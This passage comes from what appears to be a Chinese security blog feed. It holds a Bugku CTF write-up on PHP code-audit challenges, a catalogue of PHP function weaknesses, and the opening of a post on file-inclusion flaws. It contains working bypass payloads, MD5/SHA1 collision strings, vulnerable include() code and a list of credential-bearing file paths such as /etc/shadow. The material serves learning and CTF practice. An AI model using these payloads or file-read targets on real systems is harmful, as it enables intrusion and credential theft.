‘3735929054’</code>，$temp为传入参数password的值，并且遍历$temp的每个字符还不能在1—-9之间</p><p>看着题目名称便想到了转换16进制</p><pre><code>payload:?password=0xdeadc0de</code></pre><p>0xdeadc0de为3735929054十六进制形式</p><pre><code>flag&#123;Bugku-admin-ctfdaimash&#125;</code></pre><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><p>题目代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;xxx&quot;;</span><br><span class="line">if (isset ($_GET[&#39;password&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">    echo &#39;</span><br><span class="line"></span><br><span class="line">    You password must be alphanumeric</span><br><span class="line"></span><br><span class="line">    &#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)</span><br><span class="line">    &#123;</span><br><span class="line">        if (strpos ($_GET[&#39;password&#39;], &#39;-&#39;) !&#x3D;&#x3D; FALSE) &#x2F;&#x2F;strpos — 查找字符串首次出现的位置</span><br><span class="line">        &#123;</span><br><span class="line">        die(&#39;Flag: &#39; . $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">        echo(&#39;</span><br><span class="line">        - have not been found</span><br><span class="line"></span><br><span class="line">        &#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">    echo &#39;</span><br><span class="line">    Invalid password</span><br><span class="line"></span><br><span class="line">    &#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ereg函数存在00截断漏洞，当ereg读取字符串string时,如果遇到了%00,后面的字符串就不会被解析</p><pre><code>payload: ?password=1e9%00*-*</code></pre><p>1e9是科学计数法，代表1x10^9</p><p>利用ereg()函数00截断漏洞，绕过匹配</p><p>*-*，应该是题目出错了，不过提示里有</p><p>另外也可以直接传数组</p><pre><code>payload: ?password[]=1flag&#123;bugku-dm-sj-a12JH8&#125;</code></pre><h2 id="strpos数组绕过"><a href="#strpos数组绕过" class="headerlink" title="strpos数组绕过"></a>strpos数组绕过</h2><p>题目代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line">if (isset ($_GET[&#39;ctf&#39;])) &#123;</span><br><span class="line">if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;ctf&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class="line">echo &#39;必须输入数字才行&#39;;</span><br><span class="line">else if (strpos ($_GET[&#39;ctf&#39;], &#39;#biubiubiu&#39;) !&#x3D;&#x3D; FALSE)</span><br><span class="line">die(&#39;Flag: &#39;.$flag);</span><br><span class="line">else</span><br><span class="line">echo &#39;骚年，继续努力吧啊~&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">ereg()函数传入数组会返回NULL,不强等于FALSE,进入else if</span><br><span class="line"></span><br><span class="line">strpos()函数传入数组会返回NULL,不强不等于FALSE,条件成立</span><br><span class="line"></span><br><span class="line">payload:?ctf[]&#x3D;</span><br><span class="line"></span><br><span class="line">flag&#123;Bugku-D-M-S-J572&#125;</span><br><span class="line">数字验证正则绕过</span><br><span class="line">题目代码：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag &#x3D; &#39;flag&#123;test&#125;&#39;;</span><br><span class="line">if (&quot;POST&quot; &#x3D;&#x3D; $_SERVER[&#39;REQUEST_METHOD&#39;])</span><br><span class="line">&#123;</span><br><span class="line">$password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">if (0 &gt;&#x3D; preg_match(&#39;&#x2F;^[[:graph:]]&#123;12,&#125;$&#x2F;&#39;, $password)) &#x2F;&#x2F;preg_match — 执行一个正则表达式匹配</span><br><span class="line">&#123;</span><br><span class="line">echo &#39;flag&#39;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">while (TRUE)</span><br><span class="line">&#123;</span><br><span class="line">$reg &#x3D; &#39;&#x2F;([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)&#x2F;&#39;;</span><br><span class="line">if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">break;</span><br><span class="line">$c &#x3D; 0;</span><br><span class="line">$ps &#x3D; array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); &#x2F;&#x2F;[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><br><span class="line">foreach ($ps as $pt)</span><br><span class="line">&#123;</span><br><span class="line">if (preg_match(&quot;&#x2F;[[:$pt:]]+&#x2F;&quot;, $password))</span><br><span class="line">$c +&#x3D; 1;</span><br><span class="line">&#125;</span><br><span class="line">if ($c &lt; 3) break;</span><br><span class="line">&#x2F;&#x2F;&gt;&#x3D;3，必须包含四种类型三种与三种以上</span><br><span class="line">if (&quot;42&quot; &#x3D;&#x3D; $password) echo $flag;</span><br><span class="line">else echo &#39;Wrong password&#39;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建</p><p>这里的$_SERVER[‘REQUEST_METHOD’]指的是请求提交数据的方式</p><p>可以看到需要POST一个参数为password的变量</p><p>下面是代码中的一些正则表达式语法</p><pre><code>[:alpha:]匹配当前归类中的大写和小写字母字符。例如，&#39;[0-9]&#123;3&#125;[[:alpha:]]&#123;2&#125;&#39; 匹配三个数字，后跟两个字母。[:alnum:]    匹配当前归类中的数字、大写和小写字母字符。例如，&#39;[[:alnum:]]+&#39; 匹配含有一个或多个字母和数字的字符串。[:digit:]    匹配当前归类中的数字。例如，&#39;[[:digit:]-]+&#39; 匹配含有一个或多个数字或横线的字符串。同样，&#39;[^[:digit:]-]+&#39; 匹配含有一个或多个不是数字或横线的字符的字符串。[:lower:]    匹配当前归类中的小写字母字符。例如，&#39;[[:lower:]]&#39; 不匹配 A，因为 A 为大写。[:space:]    匹配单个空格 (&#39; &#39;）[:upper:]    匹配当前归类中的大写字母字符。例如，&#39;[[:upper:]ab]&#39; 与以下其中一项匹配：任何大写字母、a 或 b。[:whitespace:]    匹配一个空白字符，例如，空格、制表符、换页符和回车符。[:ascii:]    匹配任何七位的 ASCII 字符（0 到 127 之间的顺序值）。[:blank:]    匹配一个空白区或水平制表符。[[:blank:]] 等效于 [ \t]。[:cntrl:]    匹配顺序值小于 32 或字符值为 127 的 ASCII 字符（控制字符）。控制字符包括换行符、换页符、退格符，等等。[:graph:]    匹配打印字符。[[:graph:]] 等效于 [[:alnum:][:punct:]]。[:print:]    匹配打印字符和空格。[[:print:]] 等效于 [[:graph:][:whitespace:]]。[:punct:]    匹配其中一个字符： !&quot;#$%&amp;&#39;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~.[:punct:] 子字符类不能包括当前归类中可用的非 ASCII 标点字符。[:word:]    匹配当前归类中的字母、数字或下划线字符。[[:word:]] 等效于 [[:alnum:]_]。[:xdigit:]    匹配字符类 [0-9A-Fa-f] 中的字符。</code></pre><p>preg_match() 函数返回 pattern 的匹配次数。 它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后 将会停止搜索</p><pre><code>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )</code></pre><p>$pattern: 要搜索的模式，字符串形式</p><p>$subject: 输入字符串</p><p>分析代码可知，传入参数必须使用POST方法，这题好像出错了，只要POST<br>一个数据就可以得到flag</p><p><strong>正确的解题方法应该是：</strong></p><p>由要让<code>0 &gt;= preg_match(&#39;/^[[:graph:]]&#123;12,&#125;$/&#39;, $password)</code>为FALSE可知password的长度应该在12个字符及以上(非空格非TAB之外的内容)</p><p>由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$reg &#x3D; &#39;&#x2F;([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)&#x2F;&#39;; </span><br><span class="line">if (6 &gt; preg_match_all($reg, $password, $arr))</span><br></pre></td></tr></table></figure><p>可知，匹配到的次数要大于6次（任意字符或大小写字母或数字）</p><p>由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ps &#x3D; array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); &#x2F;&#x2F;[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母 </span><br><span class="line">foreach ($ps as $pt) </span><br><span class="line">&#123; </span><br><span class="line">    if (preg_match(&quot;&#x2F;[[:$pt:]]+&#x2F;&quot;, $password)) </span><br><span class="line">        $c +&#x3D; 1; </span><br><span class="line">&#125; </span><br><span class="line">if ($c &lt; 3) break; </span><br></pre></td></tr></table></figure><p>可知，必须要有大小写字母，数字，字符内容三种与三种以上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (&quot;42&quot; &#x3D;&#x3D; $password) echo $flag; </span><br></pre></td></tr></table></figure><p>必须弱等于42</p><pre><code>payload：POST过去password=42.0000e%2b000000000password=420.000000000000e-1%2b为+号的url编码，-号的url编码为-</code></pre><p>这里用的是科学计数法绕过</p><p>出现<code>flag&#123;test&#125;</code>才意味着得到真正的flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> bugku </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php一些常见函数漏洞</title>
      <link href="2019/09/25/php-function-leak/"/>
      <url>2019/09/25/php-function-leak/</url>
      
        <content type="html"><![CDATA[<p>本篇博客介绍了php的一些常见函数的漏洞！</p><a id="more"></a><h2 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h2><h3 id="md5弱比较"><a href="#md5弱比较" class="headerlink" title="md5弱比较"></a>md5弱比较</h3><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p><p>攻击者可以利用这一漏洞，通过输入一个经过哈希后以”0E”开头的字符串，即会被PHP解释为0，如果数据库中存在这种哈希值以”0E”开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。</p><p><strong>但并不是所有MD5值0e开头的都弱相等，只有一些特殊的字符串，即后面是纯数字的</strong></p><pre><code>0e开头的md5和原值：2406107080e462097431906509019562988736854QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020</code></pre><p>还有MD5和双MD5以后的值都是<code>0e</code>开头的</p><ul><li><code>CbDLytmyGm2xQyaLNhWn</code></li><li><code>770hQgrBOjrcqftrlaZk</code></li><li><code>7r4lGXCH2Ksu2JNT3BYM</code></li></ul><h3 id="不能处理数组"><a href="#不能处理数组" class="headerlink" title="不能处理数组"></a>不能处理数组</h3><p>md5()函数和sha1()函数一样，如果成功则返回已计算的哈希散列，如果失败则返回NULL，对于一些比较可以通过此方法绕过</p><h3 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h3><p>两个MD5相同的不同字符串</p><pre><code>Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><p>sha1()函数也有相似的碰撞</p><pre><code>a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</code></pre><p>注意提交时使用bp抓包，不能直接提交，否则的话浏览器解码，数据会不完整，其实就相当于比较两个文件的hash</p><h2 id="strcmp-函数"><a href="#strcmp-函数" class="headerlink" title="strcmp()函数"></a>strcmp()函数</h2><p>strcmp() 函数用于比较两个字符串</p><p>假设比较的两字符串为string1和string2，函数的返回值将有下面三种情况：</p><pre><code>0 - 如果两个字符串相等&lt;0 - 如果 string1 小于 string20 - 如果 string1 大于 string2</code></pre><p>当比较数组和字符串的时候，返回是NULL</p><h2 id="is-numeric-函数"><a href="#is-numeric-函数" class="headerlink" title="is_numeric()函数"></a>is_numeric()函数</h2><p>用于检测变量是否为数字或数字字符串，是数字和数字字符串则返回 TRUE，否则返回 FALSE,包括数组</p><p>is_numeric()函数检测的时候会自动过滤掉前面的 ‘ ‘, ‘\t’, ‘\n’, ‘\r’, ‘\v’, ‘\f’等字符，但是不会过滤 ‘\0’，如果这些字符出现在字符串尾，也不会过滤，而是返回 false。</p><pre><code>var_dump(is_numeric(&quot;\01&quot;)); // falsevar_dump(is_numeric(&quot; 1&quot;)); // truevar_dump(is_numeric(&quot;\t1&quot;)); // truevar_dump(is_numeric(&quot;\n1&quot;)); // truevar_dump(is_numeric(&quot;\r1&quot;)); // truevar_dump(is_numeric(&quot;\v1&quot;)); // truevar_dump(is_numeric(&quot;\f1&quot;)); // truevar_dump(is_numeric(&quot;\f\f1&quot;)); // truevar_dump(is_numeric(&quot;1\f&quot;)); // false</code></pre><p>如果有两个is_numeric判断的时候用and连接起来，and后面的is_numberic判断可忽略</p><pre><code>is_numeric(&#39;1&#39;) and is_numeric(&#39;a&#39;)        //true</code></pre><h2 id="ereg-函数"><a href="#ereg-函数" class="headerlink" title="ereg()函数"></a>ereg()函数</h2><p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。</p><p>如果没有传递入可选参数 regs 或者所匹配的字符串长度为 0，则本函数返回 1</p><pre><code>int ereg ( string $pattern , string $string [, array &amp;$regs ] ) </code></pre><p><strong>利用：</strong></p><p>ereg函数存在00截断漏洞，当ereg读取字符串string时,如果遇到了%00,后面的字符串就不会被解析。</p><p>ereg函数处理数组，会返回NULL</p><h2 id="strpos-函数"><a href="#strpos-函数" class="headerlink" title="strpos()函数"></a>strpos()函数</h2><p>用于查找字符串首次出现的位置</p><pre><code>int strpos( string $haystack, mixed $needle[, int $offset = 0] )</code></pre><p>haystack 在该字符串中进行查找。</p><p>needle 如果 needle 不是一个字符串，那么它将被转换为整型并被视为字符的顺序值。</p><p>offset 如果提供了此参数，搜索会从字符串该字符数的起始位置开始统计。如果是负数，搜索会从字符串结尾指定字符数开始。</p><p>如果没找到 needle，将返回 FALSE。</p><p><strong>利用</strong><br>当$haystack为数组时，函数返回NULL，当$needle为数组时函数返回flase</p><h2 id="preg-match-函数"><a href="#preg-match-函数" class="headerlink" title="preg_match()函数"></a>preg_match()函数</h2><p>限制开头结尾，不是多行匹配，如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$json = <span class="string">&quot;\nflag&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^flag$/&#x27;</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出123</span></span><br></pre></td></tr></table></figure><p>另外还有最大次数正则回溯绕过</p><h2 id="intval函数"><a href="#intval函数" class="headerlink" title="intval函数"></a>intval函数</h2><p><strong>Intval函数</strong>用于获取变量整数数值<br>Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p><p>这个有个应用就是在判断数值是不是回文上，如果参数为2147483647，那么当它反过来，由于超出了限制，所以依然等于2147483647。即为回文。</p><p>intval函数能被%00截断，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$number=<span class="string">&#x27;0&#x27;</span>.chr(<span class="number">0</span>).<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">var_dump(intval($number));</span><br><span class="line"><span class="keyword">if</span>($number!=strval(intval($number)))&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出123</span></span><br></pre></td></tr></table></figure><h2 id="switch函数"><a href="#switch函数" class="headerlink" title="switch函数"></a>switch函数</h2><p>如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型，效果相当于intval函数，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$i =<span class="string">&quot;abc&quot;</span>;  </span><br><span class="line"><span class="keyword">switch</span> ($i) &#123;  </span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">456</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 输出123</span></span><br></pre></td></tr></table></figure><p>switch没有碰到break时会一直往下执行，直到遇到break,例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$i =<span class="string">&quot;abc&quot;</span>;  </span><br><span class="line"><span class="keyword">switch</span> ($i) &#123;  </span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">123</span>; </span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">456</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出123456</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> php函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞及利用方式</title>
      <link href="2019/09/20/file-contant-leak/"/>
      <url>2019/09/20/file-contant-leak/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了文件包含漏洞及利用方式！</p><a id="more"></a><h2 id="有关包含的函数"><a href="#有关包含的函数" class="headerlink" title="有关包含的函数"></a>有关包含的函数</h2><p>PHP中文件包含函数有以下四种：</p><ol><li>include()</li><li>include_once()</li><li>require()</li><li>require_once()</li></ol><p>include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。</p><p>而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p><h2 id="本地包含LFI-Local-File-Inclusion"><a href="#本地包含LFI-Local-File-Inclusion" class="headerlink" title="本地包含LFI(Local File Inclusion)"></a>本地包含LFI(Local File Inclusion)</h2><h3 id="无限制本地文件包含漏洞"><a href="#无限制本地文件包含漏洞" class="headerlink" title="无限制本地文件包含漏洞"></a>无限制本地文件包含漏洞</h3><p><strong>测试代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/09/20/file-contant-leak/1535362888_5b83c7486a92c.png"></p><p>通过目录遍历漏洞可以获取到系统中其他文件的内容：</p><p>常见的敏感信息路径：</p><p><strong>Windows系统</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c:\boot.ini &#x2F;&#x2F; 查看系统版本</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F; IIS配置文件</span><br><span class="line"></span><br><span class="line">c:\windows\repair\sam &#x2F;&#x2F; 存储Windows系统初次安装的密码</span><br><span class="line"></span><br><span class="line">c:\ProgramFiles\mysql\my.ini &#x2F;&#x2F; MySQL配置</span><br><span class="line"></span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F; MySQL root密码</span><br><span class="line"></span><br><span class="line">c:\windows\php.ini &#x2F;&#x2F; php 配置信息</span><br></pre></td></tr></table></figure><p><strong>Linux/Unix系统</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;shadow &#x2F;&#x2F; 账户密码文件</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2默认配置文件</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; 虚拟网站配置</span><br><span class="line"></span><br><span 